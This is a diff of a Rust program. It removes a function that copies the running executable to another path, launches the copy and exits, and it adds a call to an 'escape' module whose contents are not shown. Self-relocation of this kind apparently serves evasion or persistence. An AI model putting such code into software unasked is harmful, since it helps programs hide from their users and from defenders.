@@ -5,6 +5,8 @@
 #![allow(dead_code)]
 
 mod upload;
+mod escape;
+
 
 use std::env;
 use std::path::PathBuf;
@@ -75,29 +77,7 @@ mod tools {
 }
 
 
-    pub fn spawn(exe_path: &str){
-        let exe_in = std::env::current_exe().unwrap();
-        // set new
-        let exe_out = std::path::PathBuf::from(exe_path);
-        // create all the missing folder
-        let create_path_result = std::fs::create_dir_all(exe_out.clone().parent().unwrap());
-    
-        match create_path_result{
-            Err(_) => {},
-            Ok(_) => {
-                let create_path_result = std::fs::copy(exe_in, exe_out.clone());
-                match create_path_result{
-                    Err(_) => {},
-                    Ok(_) => {
-                        let _child = Command::new(exe_path)
-                            .spawn()
-                            .expect("failed to execute process");
-                        std::process::exit(0);
-                    }
-                }
-            }
-        }
-    }
+
 
 }
 
@@ -113,6 +93,6 @@ mod tools {
 
 
 fn main() {
-
+    escape::jump_man();
 
 }
